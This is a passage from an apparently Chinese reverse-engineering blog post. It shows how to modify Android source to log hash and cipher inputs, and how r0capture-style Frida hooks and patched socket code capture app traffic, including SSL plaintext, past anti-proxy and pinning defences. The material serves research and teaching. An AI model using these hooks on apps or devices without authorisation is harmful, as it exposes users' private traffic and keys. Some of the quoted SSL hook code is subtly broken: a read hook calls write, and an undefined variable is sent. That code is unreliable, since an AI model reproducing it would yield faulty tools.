检测出来，因此，我们打算直接从系统源码层面修改代码。虽然 hook 沙箱与源码沙箱实现方式不同，但是两者都是采取对源码插桩的方式实现的，只是 hook 是针对二进制的动态代码插桩，源码沙箱是针对源码的插桩。我们要实现源码沙箱，只需要针对目标函数内容进行修改即可。</p><p>&emsp;以 Android 7.1.2_r8 为例，生成对应的 idegen.jar，android.iml（包含源码导入 Android studio 时会被导入和派出的子目录），android.ipr（源码工程的具体配置、代码以及依赖的 lib）文件，之后直接用 android studio 打开 ipr 文件即可。</p><p>&emsp;我们直接修改 MessageDigest 的源码，但要解决 2 个问题：（1）用什么方式进行自吐，解决方法 a：<code>日志打印，即调用 android.util.Log，但是无法通过 import 导入，因为会出现 cannot find symbol 的问题，可使用反射方式（运行时动态获取类的信息并操作对象）调用 Log 中的函数，但要处理反射可能带来的异常</code>；（2）确定哪一个是重载函数，是否存在相互调用的情况，解决方法 b：<code>首先用 Objection 确定 MessageDigest 类中存在的目标函数，找到所有重载后，直接源码分析每一个重载函数，如果某函数内没有再次调用其他重载函数，那么就要进行源码插桩；解决方法 c：方法 b 无法处理添加新的函数的问题，因此，运行 make update-api。具体见 P163。</code></p><p>&emsp;解决方法 a：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// update</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">logClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// load class</span></span><br><span class="line">    logClass = <span class="built_in">this</span>.getClass().getClassLoader().loadClass(<span class="string">&quot;android.util.Log&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Method</span> <span class="variable">loge</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// get corresponding method</span></span><br><span class="line">    loge = logClass.getMethod(<span class="string">&quot;e&quot;</span>, String.class, String.class);</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// call method</span></span><br><span class="line">    loge.invoke(<span class="literal">null</span>, <span class="string">&quot;wd2711&quot;</span>, <span class="string">&quot;input =&gt; &quot;</span> + inputString);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;ps：自己编译的镜像一般都有 root 权限（具有 su 指令），要想不要 root 权限，那么直接 lunch 选择 user 类型（直接打字 user，而不是选择标号）即可。</p><p>&emsp;最后，就可以建立一个 Hash 自吐的沙箱。由于我已经详细知晓步骤，所以，为了加快时间，就不进行实验了，对下面的章节也是这样，除非我认为这是很有必要做的实验。</p><h3 id="crypto-filter-aosp-项目移植"><a href="#crypto-filter-aosp-项目移植" class="headerlink" title="crypto_filter_aosp 项目移植"></a>crypto_filter_aosp 项目移植</h3><p>&emsp;下面针对 com.xiaojianbang.app 关于 AES/DES/RSA 算法进行分析，使用 jadx 可以得到它们的源码（在此只列出 AES 的源码）：</p><p><img src="/images/frida-reverse-analysis-3/image-20240119210512045.png" alt="image-20240119210512045" style="zoom:67%;" /></p><p>&emsp;可以发现，控制加解密的类是 <code>javax.crypto.Cipher</code>，init 用于传递密钥和向量，update 用于更新加解密输入，doFinal 用于进行真正的加解密过程。本小节不进行相关的沙箱开发，而是使用一个项目 <a href="https://github.com/icew4y/crypto_filter_aosp">crypro_filter_aosp</a>，它是一个监控 java 层加密算法的 ROM（只读存储），它的输出就是向目录中写文件，且只能监控一个 app。</p><p>&emsp;此项目是针对 nexux 6p android 6.0.1 的，如果想要复用就要做修改。此项目包含 6 个文件，修改后直接覆盖掉 android 8.1.0 的源码即可。要进行修改，就要对比 android 6.0.1 源码与项目代码，比较改了什么。其次，此项目在输出时将一次加解密过程输出一条日志（前面的沙箱在一次加解密过程中输出多条日志），这是因为，此项目增加了成员变量 jsoninfo，在 init 与 update 函数中，更新 jsoninfo 信息，在最终的 doFinal 运行时，把此变量输出到文件，并清空 jsoninfo。</p><p>&emsp;由于此项目添加了原来 android 源码中没有的文件，所以需要在 libcore 目录的 obenjdk_java_files.mk 中增加相应文件的全路径，添加完成后还需要执行 make update-api 更新系统 api。</p><p>ps：check_oom 一般是检测内存是否溢出的函数，在微软的区块链钱包中也有此函数。</p><h2 id="0x07-Android沙箱开发之网络库与系统库“自吐”"><a href="#0x07-Android沙箱开发之网络库与系统库“自吐”" class="headerlink" title="0x07 Android沙箱开发之网络库与系统库“自吐”"></a>0x07 Android沙箱开发之网络库与系统库“自吐”</h2><p>&emsp;很多 App 都对抓包进行了相应的防御，例如反 wifi 代理、反 VPN 代理、服务器校验客户端/客户端校验服务器（CA 证书层面）。虽然工具 r0capture 从代码层面抓取数据包，绕过了以上这些应对中间人抓包的对抗方式，但是由于其依赖于 frida，因此很容易被检测到。</p><h3 id="基于-r0capture-的源码沙箱网络库“自吐”"><a href="#基于-r0capture-的源码沙箱网络库“自吐”" class="headerlink" title="基于 r0capture 的源码沙箱网络库“自吐”"></a>基于 r0capture 的源码沙箱网络库“自吐”</h3><p>&emsp;要构建沙箱，首先要找到源码中关键代码的位置。在 TCP/IP 模型中，由于 App 是属于应用层，因此只能修改所使用的应用层协议类型、数据格式、传输端口、或者用 TCP/UDP 直接通信。基本没有 App 可以修改网络层内容，即使是 VPN app，也只是创建出新的网络接口，IP 还是 VPN server 分配的。目前，有很多网络通信框架通信，例如 Okhttp（访问网站）、Exoplayer（播放视频）、Glide（异步平滑图片滚动加载框架），这些框架底层还是使用系统 API 处理。基于此，app 采取多种手段防止应用层的抓包，例如，app 使用特定 API（<code>Proxy.NO_PROXY</code>、<code>System.getProperty(&quot;http.proxyHost&quot;)</code> 等）检测来防止 wifi 代理，即使使用 VPN app 从网络层将数据流转发到抓包软件，也可以使用 <code>getNetWorkCapbilities()</code> 来检测网络接口，从而检测 VPN app。我们可以使用 objection 对 <code>android.net.ConnectivityManager.getNetWorkCapbilities()</code> 进行勾取，从而发现一些 VPN 使用的痕迹。</p><p>&emsp;App 还可以通过证书层面来检测抓包，例如<code>客户端校验服务器的方式，即在客户端和服务器进行握手时，验证 CA 的 hash 值，来达到只与持有相同 CA 的服务器进行通信，而服务器只与持有特定 CA 的客户端进行交互</code>。</p><p>&emsp;由于协议通用性问题，即使在应用层做了很多防护手段，攻击者也可以绕过。因此开发者可能会使用小众协议甚至自研应用层协议（腾讯的 JceStruct 协议），即使数据流量被窃取，也无法得到有效信息。自研的协议可以很大发挥传输层功能，例如，（1）某厂商使用自建代理长连的网络方案，app 请求通过 CIP (Common industrial protocol，用于工业自动化领域的通信协议，提供了标准化的方式来相互通信）通道中的 TCP 子通道与长连服务器通信，长连服务器与业务服务器进行通信；（2）某厂商自研内核、算法、传输层网络库与服务端，此时使用沙箱也无法对 app 进行抓包。</p><p>&emsp;但是大多数 app 都是直接调用系统 API，我们只需要在应用层下层，对 socket 接口相关函数进行 hook，就可以抓到封装成 http 的应用数据，之后，这些数据使用 SSL 进行加密，并通过 socket 与服务器进行通信。下面是一个 app 的网络函数调用图（会话层 (SSL) -&gt; 表示层 (HTTP) -&gt; 应用层 (自定义视频流解密) -&gt; 应用层 (播放解密后的流媒体)）：</p><p><img src="/images/frida-reverse-analysis-3/image-20240120105331069.png" alt="image-20240120105331069" style="zoom:67%;" /></p><p>&emsp;通过 hook socket 函数，所监听的上层数据可以分为加密/未加密两种类型，并针对多个应用层协议进行验证与测试。我们可以得出以下结论，如果数据未加密，那么如果是发送数据，那么一定会经过 <code>java.net.SocketOutputStream</code> 的 <code>socketWrite0()</code> 函数，如果是接收数据，那么一定会经过<code>java.net.SocketInputStream</code> 的 <code>socketRead0()</code> 函数。通过分析以下 r0capture 代码，从而了解关于<code>未加密数据</code>的 hook 脚本（并不是修改源码）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// overload socketWrite0</span></span><br><span class="line"><span class="comment">// 有参数函数的 overload</span></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.net.SocketOutputStream&quot;</span>).<span class="property">socketWrite0</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.io.FileDescriptor&#x27;</span>, <span class="string">&#x27;[B&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">fd, bytearry, offset, byteCount</span>) &#123;</span><br><span class="line">    <span class="comment">// 调用原函数</span></span><br><span class="line">    <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">socketWrite0</span>(fd, bytearry, offset, byteCount);</span><br><span class="line">    <span class="comment">// 进行信息记录</span></span><br><span class="line">    <span class="keyword">var</span> message = &#123;&#125;;</span><br><span class="line">    message[<span class="string">&quot;function&quot;</span>] = <span class="string">&quot;HTTP_send&quot;</span>;</span><br><span class="line">    message[<span class="string">&quot;ssl_session_id&quot;</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    message[<span class="string">&quot;src_addr&quot;</span>] = <span class="title function_">ntohl</span>(<span class="title function_">ipToNumber</span>((<span class="variable language_">this</span>.<span class="property">socket</span>.<span class="property">value</span>.<span class="title function_">getLocalAddress</span>().<span class="title function_">toString</span>().<span class="title function_">split</span>(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]).<span class="title function_">split</span>(<span class="string">&quot;/&quot;</span>).<span class="title function_">pop</span>()));</span><br><span class="line">    message[<span class="string">&quot;src_port&quot;</span>] = <span class="built_in">parseInt</span>(<span class="variable language_">this</span>.<span class="property">socket</span>.<span class="property">value</span>.<span class="title function_">getLocalPort</span>().<span class="title function_">toString</span>());</span><br><span class="line">    <span class="comment">// 需要注意的是，这里完全可以用 this.socket.toString 而不是 this.socket.value.getRemoteSocketAddress 来实现目的地址的获取，因为 Socket 对应的内容就是目的地址信息，这是通过 Objection 的插件 wallbreaker 查看 java.net.SocketOutputStream 对象的成员结构发现的</span></span><br><span class="line">    message[<span class="string">&quot;dst_addr&quot;</span>] = <span class="title function_">ntohl</span>(<span class="title function_">ipToNumber</span>((<span class="variable language_">this</span>.<span class="property">socket</span>.<span class="property">value</span>.<span class="title function_">getRemoteSocketAddress</span>().<span class="title function_">toString</span>().<span class="title function_">split</span>(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]).<span class="title function_">split</span>(<span class="string">&quot;/&quot;</span>).<span class="title function_">pop</span>()));</span><br><span class="line">    message[<span class="string">&quot;dst_port&quot;</span>] = <span class="built_in">parseInt</span>(<span class="variable language_">this</span>.<span class="property">socket</span>.<span class="property">value</span>.<span class="title function_">getRemoteSocketAddress</span>().<span class="title function_">toString</span>().<span class="title function_">split</span>(<span class="string">&quot;:&quot;</span>).<span class="title function_">pop</span>());</span><br><span class="line">    <span class="comment">// 打印调用栈</span></span><br><span class="line">    message[<span class="string">&quot;stack&quot;</span>] = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()).<span class="title function_">toString</span>();</span><br><span class="line">    <span class="keyword">var</span> ptr = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(byteCount);</span><br><span class="line">    <span class="comment">// 将 bytearray 写入到 ptr，并将 ptr 与记录的信息一块发出去</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; byteCount; ++i) &#123;</span><br><span class="line">        <span class="title class_">Memory</span>.<span class="title function_">writeS8</span>(ptr.<span class="title function_">add</span>(i), bytearry[offset + i]);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="title function_">send</span>(message, <span class="title class_">Memory</span>.<span class="title function_">readByteArray</span>(ptr, byteCount));</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.net.SocketInputStream&quot;</span>).<span class="property">socketRead0</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.io.FileDescriptor&#x27;</span>, <span class="string">&#x27;[B&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">fd, bytearry, offset, byteCount, timeout</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">socketRead0</span>(fd, bytearry, offset, byteCount, timeout);</span><br><span class="line">      <span class="keyword">var</span> message = &#123;&#125;;</span><br><span class="line">      message[<span class="string">&quot;function&quot;</span>] = <span class="string">&quot;HTTP_recv&quot;</span>;</span><br><span class="line">      message[<span class="string">&quot;ssl_session_id&quot;</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      message[<span class="string">&quot;src_addr&quot;</span>] = <span class="title function_">ntohl</span>(<span class="title function_">ipToNumber</span>((<span class="variable language_">this</span>.<span class="property">socket</span>.<span class="property">value</span>.<span class="title function_">getRemoteSocketAddress</span>().<span class="title function_">toString</span>().<span class="title function_">split</span>(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]).<span class="title function_">split</span>(<span class="string">&quot;/&quot;</span>).<span class="title function_">pop</span>()));</span><br><span class="line">      message[<span class="string">&quot;src_port&quot;</span>] = <span class="built_in">parseInt</span>(<span class="variable language_">this</span>.<span class="property">socket</span>.<span class="property">value</span>.<span class="title function_">getRemoteSocketAddress</span>().<span class="title function_">toString</span>().<span class="title function_">split</span>(<span class="string">&quot;:&quot;</span>).<span class="title function_">pop</span>());</span><br><span class="line">      message[<span class="string">&quot;dst_addr&quot;</span>] = <span class="title function_">ntohl</span>(<span class="title function_">ipToNumber</span>((<span class="variable language_">this</span>.<span class="property">socket</span>.<span class="property">value</span>.<span class="title function_">getLocalAddress</span>().<span class="title function_">toString</span>().<span class="title function_">split</span>(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]).<span class="title function_">split</span>(<span class="string">&quot;/&quot;</span>).<span class="title function_">pop</span>()));</span><br><span class="line">      message[<span class="string">&quot;dst_port&quot;</span>] = <span class="built_in">parseInt</span>(<span class="variable language_">this</span>.<span class="property">socket</span>.<span class="property">value</span>.<span class="title function_">getLocalPort</span>());</span><br><span class="line">      message[<span class="string">&quot;stack&quot;</span>] = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()).<span class="title function_">toString</span>();</span><br><span class="line">      <span class="keyword">if</span> (result &gt; <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="comment">// bytearry 的数据长度并不是 byteCount，而是 scoketRead0 执行完后的返回值 result</span></span><br><span class="line">          <span class="keyword">var</span> ptr = <span class="title class_">Memory</span>.<span class="title function_">alloc</span>(result);</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; result; ++i) &#123;</span><br><span class="line">              <span class="title class_">Memory</span>.<span class="title function_">writeS8</span>(ptr.<span class="title function_">add</span>(i), bytearry[offset + i]);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="title function_">send</span>(message, <span class="title class_">Memory</span>.<span class="title function_">readByteArray</span>(ptr, result))</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;可以发现，输出的信息包括：地址，数据信息，函数调用栈（便于解密数据）。</p><p>&emsp;上面是 r0capture 使用 frida 的勾取，对于修改安卓源码的沙箱而言，（1）完全可以用 this.socket.toString 而不是 this.socket.value.getRemoteSocketAddress（r0capture 的做法） 来实现目的地址的获取，因为 Socket 对应的内容就是目的地址信息；（2）由于 <code>socketWrite0</code> 与 <code>socketRead0</code> 都是 native 函数，其具体实现都是 native 层，为了避免对 native 层的代码（so 文件中）进行修改，所以对其上层函数（调用链为： <code>socketRead -&gt; socketRead0</code>），也就是 <code>socketRead</code> 进行修改；（3）调用栈打印时，可以使用 <code>Exception e = new Exception(&quot;wd2711SOCKETresponse&quot;); e.printStackTrace();</code> 修改 <code>Log.getStackTraceString(Throwable)</code>（r0capture 的做法）。最后修改后的安卓源码为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// socketInputStream.java</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="title function_">socketRead</span><span class="params">(FileDescriptor fd, <span class="type">byte</span> b[], <span class="type">int</span> off, <span class="type">int</span> len, <span class="type">int</span> timeout)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> socketRead0(fd, b, off, len, timeout);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// b -&gt; input</span></span><br><span class="line">        <span class="type">byte</span>[] input = <span class="keyword">new</span> <span class="title class_">byte</span>[result];</span><br><span class="line">        System.arraycopy(b, off, input, <span class="number">0</span>, result);</span><br><span class="line">        <span class="type">String</span> <span class="variable">inputString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(input);</span><br><span class="line">        <span class="comment">// 获得 Log.e 函数</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">logClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            logClass = <span class="built_in">this</span>.getClass().getClassLoader().loadClass(<span class="string">&quot;android.util.Log&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">loge</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            loge = logClass.getMethod(<span class="string">&quot;e&quot;</span>, String.class, String.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 打印目的地址</span></span><br><span class="line">            loge.invoke(<span class="literal">null</span>,<span class="string">&quot;r0ysueSOCKETresponse&quot;</span>,<span class="string">&quot;Socket is =&gt; &quot;</span> + <span class="built_in">this</span>.socket.toString());</span><br><span class="line">            <span class="comment">// 打印接收到的信息</span></span><br><span class="line">            loge.invoke(<span class="literal">null</span>,<span class="string">&quot;r0ysueSOCKETresponse&quot;</span>,<span class="string">&quot;buffer is =&gt; &quot;</span> + inputString);</span><br><span class="line">            <span class="comment">// 打印函数调用栈</span></span><br><span class="line">            <span class="type">Exception</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Exception</span>(<span class="string">&quot;wd2711SOCKETresponse&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;以上是<code>未加密数据</code>的沙箱“自吐”，下面关注一波<code>加密</code>数据的沙箱“自吐”。要是加密的话，加密机制拉满了的话就是先 app 数据加密，之后再 SSL 加密。r0capture（基于 frida）的工具针对 SSL 加密的话（代码如下）主要是参考 frida_ssl_logger 在 native 层的 hook，要是我们想通过修改源码的话，这部分行不通。因此我们找找其他办法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// r0capture 对 SSL data 的自吐，这里没有打印调用栈信息，这是因为 frida 打印的 native 层（SSL_read 与 SSL_write）的调用栈信息可能不准确，所以在 java 层处理调用栈信息，并保存到全局变量中</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">SSLstackwrite</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">SSLstackread</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SSL_read 的 args[0] -&gt; SSL 连接的上下文指针</span></span><br><span class="line"><span class="comment">//             args[1] -&gt; SSL_read 执行完后存放到 args[1]，是 SSL 解密后的数据</span></span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(addresses[<span class="string">&quot;SSL_read&quot;</span>], &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> ms = <span class="title function_">getPortAndAddresses</span>(<span class="title function_">SSL_get_fd</span>(args[<span class="number">0</span>]), <span class="literal">true</span>);</span><br><span class="line">        ms[<span class="string">&quot;ssl_session_id&quot;</span>] = <span class="title function_">getSslSessionId</span>(args[<span class="number">0</span>]);</span><br><span class="line">        ms[<span class="string">&quot;function&quot;</span>] = <span class="string">&quot;SSL_read&quot;</span>;</span><br><span class="line">        ms[<span class="string">&quot;stack&quot;</span>] = <span class="title class_">SSLstackread</span>;</span><br><span class="line">        <span class="comment">// 构造 this.message 与 this.buf 结构</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">message</span> = ms;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">buf</span> = args[<span class="number">1</span>];</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">ret</span>) &#123;</span><br><span class="line">        <span class="comment">// 将 ret 转为 32bit 数字</span></span><br><span class="line">        ret |= <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ret &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 展示 ssl_session_id + function name + SSL_read 后的结果 + SSL_read 返回的值</span></span><br><span class="line">        <span class="title function_">send</span>(<span class="variable language_">this</span>.<span class="property">message</span>, <span class="title class_">Memory</span>.<span class="title function_">readByteArray</span>(<span class="variable language_">this</span>.<span class="property">buf</span>, ret));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// SSL_read 的 args[0] -&gt; SSL 连接的上下文指针</span></span><br><span class="line"><span class="comment">//             args[1] -&gt; 将要经过 SSL 加密的数据放到 args[1] 中</span></span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(addresses[<span class="string">&quot;SSL_write&quot;</span>], &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> ms = <span class="title function_">getPortAndAddresses</span>(<span class="title function_">SSL_get_fd</span>(args[<span class="number">0</span>]), <span class="literal">false</span>);</span><br><span class="line">        ms[<span class="string">&quot;ssl_session_id&quot;</span>] = <span class="title function_">getSslSessionId</span>(args[<span class="number">0</span>]);</span><br><span class="line">        ms[<span class="string">&quot;function&quot;</span>] = <span class="string">&quot;SSL_write&quot;</span>;</span><br><span class="line">        ms[<span class="string">&quot;stack&quot;</span>] = <span class="title class_">SSLstackwrite</span>;</span><br><span class="line">        <span class="title function_">send</span>(message, <span class="title class_">Memory</span>.<span class="title function_">readByteArray</span>(args[<span class="number">1</span>], <span class="built_in">parseInt</span>(args[<span class="number">2</span>])));</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">ret</span>) &#123;&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLInputStream&quot;</span>).<span class="property">read</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">bytearry, int1, int2</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">write</span>(bytearry, int1, int2);</span><br><span class="line">    <span class="title class_">SSLstackwrite</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()).<span class="title function_">toString</span>();</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLOutputStream&quot;</span>).<span class="property">write</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">bytearry, int1, int2</span>) &#123;</span><br><span class="line">    <span 